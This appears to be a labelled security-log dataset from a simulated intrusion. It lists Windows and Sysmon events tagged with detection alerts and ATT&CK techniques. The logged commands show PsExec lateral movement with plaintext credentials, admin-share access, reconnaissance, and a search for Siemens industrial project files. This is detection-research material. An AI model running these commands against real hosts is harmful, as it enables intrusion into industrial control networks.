4584,Attack Step 4,"May 9, 2025 @ 16:16:33.664",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,11,3088,,,,,,,Windows11\\Windows11,,,,12,92207,Executable file dropped in Users\Public folder,[T1105],[Command and Control],[Ingress Tool Transfer]
4585,Attack Step 4,"May 9, 2025 @ 16:16:34.114",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\System32\\SearchFilterHost.exe\"" 892 2608 2784 872 {5E941D80-BF96-11CD-B579-08002B30BFEB}",,3,67027,A process was created.,,,
4586,Attack Step 4,"May 9, 2025 @ 16:17:12.454",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4587,Attack Step 4,"May 9, 2025 @ 16:17:12.460",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4588,Attack Step 4,"May 9, 2025 @ 16:17:12.467",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\system32\\net.exe\"" use \\\\10.12.25.5\\admin$ /u:Windows11EWS Windows11EWS",,3,67027,A process was created.,,,
4589,Attack Step 4,"May 9, 2025 @ 16:17:12.473",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4590,Attack Step 4,"May 9, 2025 @ 16:17:12.556",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,1,3088,,,,,,,Windows11\\Windows11,C:\\WINDOWS\\system32\\wsmprovhost.exe -Embedding,"\""C:\\WINDOWS\\system32\\net.exe\"" use \\\\10.12.25.5\\admin$ /u:Windows11EWS Windows11EWS",,3,92037,A net.exe connection to a remote resource was started by C:\\Windows\\System32\\wsmprovhost.exe,[T1567],[Exfiltration],[Exfiltration Over Web Service]
4591,Attack Step 4,"May 9, 2025 @ 16:17:12.807",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.3,,,,,,,6,92657,"Successful Remote Logon Detected - User:\Windows11EWS - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4592,Attack Step 4,"May 9, 2025 @ 16:17:12.807",16,10.12.25.5,Windows11EWS,Security,4672,960,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4593,Attack Step 4,"May 9, 2025 @ 16:17:34.525",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4594,Attack Step 4,"May 9, 2025 @ 16:17:34.640",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4595,Attack Step 4,"May 9, 2025 @ 16:17:34.718",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\Users\\Public\\PsTools4\\PsExec.exe\"" \\\\10.12.25.5 -u Windows11EWS -p Windows11EWS -accepteula cmd.exe",,3,67027,A process was created.,,,
4596,Attack Step 4,"May 9, 2025 @ 16:17:34.868",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4597,Attack Step 4,"May 9, 2025 @ 16:17:34.961",16,10.12.25.5,Windows11EWS,System,7045,916,,,,,,,,,,,12,92650,New Windows Service Created to start from windows root path. Suspicious event as the binary may have been dropped using Windows Admin Shares.,[T1021.002 T1569.002],"[Lateral Movement, Execution]","[SMB/Windows Admin Shares, Service Execution]"
4598,Attack Step 4,"May 9, 2025 @ 16:17:34.962",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,11,3668,,,,,,,NT AUTHORITY\\SYSTEM,,,,6,92218,Possible abuse of Windows admin shares by binary dropped in Windows root folder by system process,[T1570],[Lateral Movement],[Lateral Tool Transfer]
4599,Attack Step 4,"May 9, 2025 @ 16:17:35.034",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,13,3668,,,,,,,NT AUTHORITY\\SYSTEM,,,,3,92307,Evidence of new service creation found in registry under HKLM\\System\\CurrentControlSet\\Services\\PSEXESVC\\ImagePath binary is: %%SystemRoot%%\\PSEXESVC.exe,[T1543.003],"[Persistence, Privilege Escalation]",[Windows Service]
4600,Attack Step 4,"May 9, 2025 @ 16:17:35.572",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.3,,,,,,,6,92657,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4601,Attack Step 4,"May 9, 2025 @ 16:17:35.635",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,C:\\WINDOWS\\PSEXESVC.exe,,3,67027,A process was created.,,,
4602,Attack Step 4,"May 9, 2025 @ 16:17:36.825",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.3,,,,,,,6,92657,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4603,Attack Step 4,"May 9, 2025 @ 16:17:37.006",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,3,3088,,,,,10.12.25.5,epmap,Windows11\\Windows11,,,,3,92105,Possible suspicious access to Windows admin shares,[T1021.002],[Lateral Movement],[SMB/Windows Admin Shares]
4604,Attack Step 4,"May 9, 2025 @ 16:17:38.016",16,10.12.25.5,Windows11EWS,Security,4624,960,,Negotiate,Advapi,,,,,,,,3,67024,Service logon event registered from non standard service account.,,,
4605,Attack Step 4,"May 9, 2025 @ 16:17:38.018",16,10.12.25.5,Windows11EWS,Security,4672,960,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4606,Attack Step 4,"May 9, 2025 @ 16:17:38.028",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,"\""cmd.exe\""",,3,67027,A process was created.,,,
4607,Attack Step 4,"May 9, 2025 @ 16:17:39.034",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,1,3668,,,,,,,WINDOWS11EWS\\Windows11EWS,C:\\WINDOWS\\PSEXESVC.exe,"\""cmd.exe\""",,4,92052,Windows command prompt started by an abnormal process,[T1059.003],[Execution],[Windows Command Shell]
4608,Attack Step 4,"May 9, 2025 @ 16:17:39.095",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4609,Attack Step 4,"May 9, 2025 @ 16:17:39.096",16,10.12.25.5,Windows11EWS,Security,4624,960,,Negotiate,Advapi,,,,,,,,3,60106,Windows Logon Success,[T1078],"[Defense Evasion, Persistence, Privilege Escalation, Initial Access]",[Valid Accounts]
4610,Attack Step 4,"May 9, 2025 @ 16:17:39.097",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,C:\\WINDOWS\\system32\\svchost.exe -k GPSvcGroup,,3,67027,A process was created.,,,
4611,Attack Step 4,"May 9, 2025 @ 16:17:40.541",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.3,,,,,,,6,92657,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4612,Attack Step 4,"May 9, 2025 @ 16:17:40.654",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\System32\\SearchProtocolHost.exe\"" Global\\UsGthrFltPipeMssGthrPipe2_ Global\\UsGthrCtrlFltPipeMssGthrPipe2 1 -2147483646 \""Software\\Microsoft\\Windows Search\"" \""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)\"" \""C:\\ProgramData\\Microsoft\\Search\\Data\\Temp\\usgthrsvc\"" \""DownLevelDaemon\""",,3,67027,A process was created.,,,
4613,Attack Step 4,"May 9, 2025 @ 16:18:03.010",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4614,Attack Step 4,"May 9, 2025 @ 16:18:03.100",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4615,Attack Step 4,"May 9, 2025 @ 16:18:03.373",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,11,3668,,,,,,,NT AUTHORITY\\SYSTEM,,,,6,92218,Possible abuse of Windows admin shares by binary dropped in Windows root folder by system process,[T1570],[Lateral Movement],[Lateral Tool Transfer]
4616,Attack Step 4,"May 9, 2025 @ 16:18:03.373",16,10.12.25.5,Windows11EWS,System,7045,916,,,,,,,,,,,12,92650,New Windows Service Created to start from windows root path. Suspicious event as the binary may have been dropped using Windows Admin Shares.,[T1021.002 T1569.002],"[Lateral Movement, Execution]","[SMB/Windows Admin Shares, Service Execution]"
4617,Attack Step 4,"May 9, 2025 @ 16:18:03.374",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,13,3668,,,,,,,NT AUTHORITY\\SYSTEM,,,,3,92307,Evidence of new service creation found in registry under HKLM\\System\\CurrentControlSet\\Services\\PSEXESVC\\ImagePath binary is: %%SystemRoot%%\\PSEXESVC.exe,[T1543.003],"[Persistence, Privilege Escalation]",[Windows Service]
4618,Attack Step 4,"May 9, 2025 @ 16:18:03.409",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\Users\\Public\\PsTools4\\PsExec.exe\"" \\\\10.12.25.5 -u Windows11EWS -p Windows11EWS cmd.exe /c \""whoami &amp; ipconfig /all &gt; C:\\Windows\\Temp\\recon3.txt\""",,3,67027,A process was created.,,,
4619,Attack Step 4,"May 9, 2025 @ 16:18:03.481",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.3,,,,,,,6,92657,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4620,Attack Step 4,"May 9, 2025 @ 16:18:03.484",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4621,Attack Step 4,"May 9, 2025 @ 16:18:03.864",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,C:\\WINDOWS\\PSEXESVC.exe,,3,67027,A process was created.,,,
4622,Attack Step 4,"May 9, 2025 @ 16:18:03.896",16,10.12.25.5,Windows11EWS,Security,4624,960,,Negotiate,Advapi,,,,,,,,3,67024,Service logon event registered from non standard service account.,,,
4623,Attack Step 4,"May 9, 2025 @ 16:18:03.916",16,10.12.25.5,Windows11EWS,Security,4672,960,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4624,Attack Step 4,"May 9, 2025 @ 16:18:04.448",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,"\""cmd.exe\"" /c \""whoami &amp; ipconfig /all &gt; C:\\Windows\\Temp\\recon3.txt\""",,3,67027,A process was created.,,,
4625,Attack Step 4,"May 9, 2025 @ 16:18:04.497",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,1,3668,,,,,,,WINDOWS11EWS\\Windows11EWS,C:\\WINDOWS\\PSEXESVC.exe,"\""cmd.exe\"" /c \""whoami &amp; ipconfig /all &gt; C:\\Windows\\Temp\\recon3.txt\""",,4,92052,Windows command prompt started by an abnormal process,[T1059.003],[Execution],[Windows Command Shell]
4626,Attack Step 4,"May 9, 2025 @ 16:18:04.498",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,1,3668,,,,,,,WINDOWS11EWS\\Windows11EWS,"\""cmd.exe\"" /c \""whoami &amp; ipconfig /all &gt; C:\\Windows\\Temp\\recon3.txt\""",whoami,,3,92032,Suspicious Windows cmd shell execution,[T1087 T1059.003],"[Discovery, Execution]","[Account Discovery, Windows Command Shell]"
4627,Attack Step 4,"May 9, 2025 @ 16:18:04.500",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,1,3668,,,,,,,WINDOWS11EWS\\Windows11EWS,"\""cmd.exe\"" /c \""whoami &amp; ipconfig /all &gt; C:\\Windows\\Temp\\recon3.txt\""",ipconfig  /all,,3,92032,Suspicious Windows cmd shell execution,[T1087 T1059.003],"[Discovery, Execution]","[Account Discovery, Windows Command Shell]"
4628,Attack Step 4,"May 9, 2025 @ 16:18:04.504",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4629,Attack Step 4,"May 9, 2025 @ 16:18:04.586",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,whoami,,3,67027,A process was created.,,,
4630,Attack Step 4,"May 9, 2025 @ 16:18:04.648",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,ipconfig  /all,,3,67027,A process was created.,,,
4631,Attack Step 4,"May 9, 2025 @ 16:18:05.281",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,3,3088,,,,,10.12.25.5,epmap,Windows11\\Windows11,,,,3,92105,Possible suspicious access to Windows admin shares,[T1021.002],[Lateral Movement],[SMB/Windows Admin Shares]
4632,Attack Step 4,"May 9, 2025 @ 16:18:06.138",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.3,,,,,,,6,92657,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4633,Attack Step 4,"May 9, 2025 @ 16:18:37.575",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4634,Attack Step 4,"May 9, 2025 @ 16:18:37.582",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4635,Attack Step 4,"May 9, 2025 @ 16:19:08.169",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4636,Attack Step 4,"May 9, 2025 @ 16:19:08.321",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4637,Attack Step 4,"May 9, 2025 @ 16:19:08.463",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\Users\\Public\\PsTools4\\PsExec.exe\"" \\\\10.12.25.5 -u Windows11EWS -p Windows11EWS cmd.exe /c \""dir /s /b C:\\*.ap* C:\\*.s7p C:\\*.zap* &gt; C:\\Windows\\Temp\\siemens_files2.txt\""",,3,67027,A process was created.,,,
4638,Attack Step 4,"May 9, 2025 @ 16:19:08.603",16,10.12.25.5,Windows11EWS,System,7045,916,,,,,,,,,,,12,92650,New Windows Service Created to start from windows root path. Suspicious event as the binary may have been dropped using Windows Admin Shares.,[T1021.002 T1569.002],"[Lateral Movement, Execution]","[SMB/Windows Admin Shares, Service Execution]"
4639,Attack Step 4,"May 9, 2025 @ 16:19:08.609",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,11,3668,,,,,,,NT AUTHORITY\\SYSTEM,,,,6,92218,Possible abuse of Windows admin shares by binary dropped in Windows root folder by system process,[T1570],[Lateral Movement],[Lateral Tool Transfer]
4640,Attack Step 4,"May 9, 2025 @ 16:19:08.628",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,13,3668,,,,,,,NT AUTHORITY\\SYSTEM,,,,3,92307,Evidence of new service creation found in registry under HKLM\\System\\CurrentControlSet\\Services\\PSEXESVC\\ImagePath binary is: %%SystemRoot%%\\PSEXESVC.exe,[T1543.003],"[Persistence, Privilege Escalation]",[Windows Service]
4641,Attack Step 4,"May 9, 2025 @ 16:19:08.691",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4642,Attack Step 4,"May 9, 2025 @ 16:19:08.902",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.3,,,,,,,6,92657,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4643,Attack Step 4,"May 9, 2025 @ 16:19:09.014",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,C:\\WINDOWS\\PSEXESVC.exe,,3,67027,A process was created.,,,
4644,Attack Step 4,"May 9, 2025 @ 16:19:09.956",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,3,3088,,,,,10.12.25.5,epmap,Windows11\\Windows11,,,,3,92105,Possible suspicious access to Windows admin shares,[T1021.002],[Lateral Movement],[SMB/Windows Admin Shares]
4645,Attack Step 4,"May 9, 2025 @ 16:19:10.321",16,10.12.25.5,Windows11EWS,Security,4624,960,,Negotiate,Advapi,,,,,,,,3,67024,Service logon event registered from non standard service account.,,,
4646,Attack Step 4,"May 9, 2025 @ 16:19:10.322",16,10.12.25.5,Windows11EWS,Security,4672,960,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4647,Attack Step 4,"May 9, 2025 @ 16:19:11.473",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,"\""cmd.exe\"" /c \""dir /s /b C:\\*.ap* C:\\*.s7p C:\\*.zap* &gt; C:\\Windows\\Temp\\siemens_files2.txt\""",,3,67027,A process was created.,,,
4648,Attack Step 4,"May 9, 2025 @ 16:19:11.490",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4649,Attack Step 4,"May 9, 2025 @ 16:19:11.641",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,1,3668,,,,,,,WINDOWS11EWS\\Windows11EWS,C:\\WINDOWS\\PSEXESVC.exe,"\""cmd.exe\"" /c \""dir /s /b C:\\*.ap* C:\\*.s7p C:\\*.zap* &gt; C:\\Windows\\Temp\\siemens_files2.txt\""",,4,92052,Windows command prompt started by an abnormal process,[T1059.003],[Execution],[Windows Command Shell]
4650,Attack Step 4,"May 9, 2025 @ 16:19:26.721",16,10.12.25.5,Windows11EWS,System,7040,916,,,,,,,,,,,3,61104,Service startup type was changed,,,
4651,Attack Step 4,"May 9, 2025 @ 16:20:13.024",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4652,Attack Step 4,"May 9, 2025 @ 16:20:13.024",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4653,Attack Step 4,"May 9, 2025 @ 16:21:13.140",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4654,Attack Step 4,"May 9, 2025 @ 16:21:13.140",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4655,Attack Step 4,"May 9, 2025 @ 16:21:21.523",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.3,,,,,,,6,92657,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4656,Attack Step 4,"May 9, 2025 @ 16:21:21.750",15,10.12.25.3,Windows11,Microsoft-Windows-Sysmon/Operational,3,3088,,,,,10.12.25.5,epmap,Windows11\\Windows11,,,,3,92105,Possible suspicious access to Windows admin shares,[T1021.002],[Lateral Movement],[SMB/Windows Admin Shares]
4657,Attack Step 4,"May 9, 2025 @ 16:21:23.349",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,"\""C:\\WINDOWS\\System32\\SearchProtocolHost.exe\"" Global\\UsGthrFltPipeMssGthrPipe3_ Global\\UsGthrCtrlFltPipeMssGthrPipe3 1 -2147483646 \""Software\\Microsoft\\Windows Search\"" \""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)\"" \""C:\\ProgramData\\Microsoft\\Search\\Data\\Temp\\usgthrsvc\"" \""DownLevelDaemon\""",,3,67027,A process was created.,,,
4658,Attack Step 4,"May 9, 2025 @ 16:21:40.731",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4659,Attack Step 4,"May 9, 2025 @ 16:21:40.731",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4660,Attack Step 4,"May 9, 2025 @ 16:22:03.403",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe\"" /ua /installsource scheduler",,3,67027,A process was created.,,,
4661,Attack Step 4,"May 9, 2025 @ 16:22:10.269",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,11,3668,,,,,,,NT AUTHORITY\\SYSTEM,,,,6,92218,Possible abuse of Windows admin shares by binary dropped in Windows root folder by system process,[T1570],[Lateral Movement],[Lateral Tool Transfer]
4662,Attack Step 4,"May 9, 2025 @ 16:22:10.326",16,10.12.25.5,Windows11EWS,System,7045,916,,,,,,,,,,,12,92650,New Windows Service Created to start from windows root path. Suspicious event as the binary may have been dropped using Windows Admin Shares.,[T1021.002 T1569.002],"[Lateral Movement, Execution]","[SMB/Windows Admin Shares, Service Execution]"
4663,Attack Step 4,"May 9, 2025 @ 16:22:10.337",16,10.12.25.5,Windows11EWS,Microsoft-Windows-Sysmon/Operational,13,3668,,,,,,,NT AUTHORITY\\SYSTEM,,,,3,92307,Evidence of new service creation found in registry under HKLM\\System\\CurrentControlSet\\Services\\PSEXESVC\\ImagePath binary is: %%SystemRoot%%\\PSEXESVC.exe,[T1543.003],"[Persistence, Privilege Escalation]",[Windows Service]
4664,Attack Step 4,"May 9, 2025 @ 16:22:10.425",15,10.12.25.3,Windows11,Security,4672,888,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4665,Attack Step 4,"May 9, 2025 @ 16:22:10.583",15,10.12.25.3,Windows11,Security,4624,888,,NTLM,NtLmSsp,10.12.25.23,,,,,,,6,92652,"Successful Remote Logon Detected - User:\Windows11 - NTLM authentication, possible pass-the-hash attack.",[T1550.002 T1078.002],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts]"
4666,Attack Step 4,"May 9, 2025 @ 16:22:10.612",16,10.12.25.5,Windows11EWS,Security,4624,960,,NTLM,NtLmSsp,10.12.25.3,,,,,,,6,92657,"Successful Remote Logon Detected - User:\ANONYMOUS LOGON - NTLM authentication, possible pass-the-hash attack - Possible RDP connection. Verify that WINDOWS11 is allowed to perform RDP connections",[T1550.002 T1078.002 T1021.001],"[Defense Evasion, Lateral Movement, Persistence, Privilege Escalation, Initial Access]","[Pass the Hash, Domain Accounts, Remote Desktop Protocol]"
4667,Attack Step 4,"May 9, 2025 @ 16:22:10.613",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,"\""C:\\Users\\Public\\PsTools4\\PsExec.exe\"" \\\\10.12.25.5 -u Windows11EWS -p Windows11EWS cmd.exe /c \""dir /s /b C:\\ProgramData\\Siemens\\Automation\\*.ap* C:\\ProgramData\\Siemens\\Automation\\*.zap* &gt; C:\\Windows\\Temp\\siemens_targeted3.txt\""",,3,67027,A process was created.,,,
4668,Attack Step 4,"May 9, 2025 @ 16:22:10.680",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,C:\\WINDOWS\\PSEXESVC.exe,,3,67027,A process was created.,,,
4669,Attack Step 4,"May 9, 2025 @ 16:22:10.903",15,10.12.25.3,Windows11,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
4670,Attack Step 4,"May 9, 2025 @ 16:22:11.727",16,10.12.25.5,Windows11EWS,Security,4624,960,,Negotiate,Advapi,,,,,,,,3,67024,Service logon event registered from non standard service account.,,,
4671,Attack Step 4,"May 9, 2025 @ 16:22:11.733",16,10.12.25.5,Windows11EWS,Security,4672,960,,,,,,,,,,,3,67028,Special privileges assigned to new logon.,[T1484],"[Defense Evasion, Privilege Escalation]",[Domain Policy Modification]
4672,Attack Step 4,"May 9, 2025 @ 16:22:11.748",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,"\""cmd.exe\"" /c \""dir /s /b C:\\ProgramData\\Siemens\\Automation\\*.ap* C:\\ProgramData\\Siemens\\Automation\\*.zap* &gt; C:\\Windows\\Temp\\siemens_targeted3.txt\""",,3,67027,A process was created.,,,
4673,Attack Step 4,"May 9, 2025 @ 16:22:11.755",16,10.12.25.5,Windows11EWS,Security,4688,4,,,,,,,,,\\??\\C:\\WINDOWS\\system32\\conhost.exe 0xffffffff -ForceV1,,3,67027,A process was created.,,,
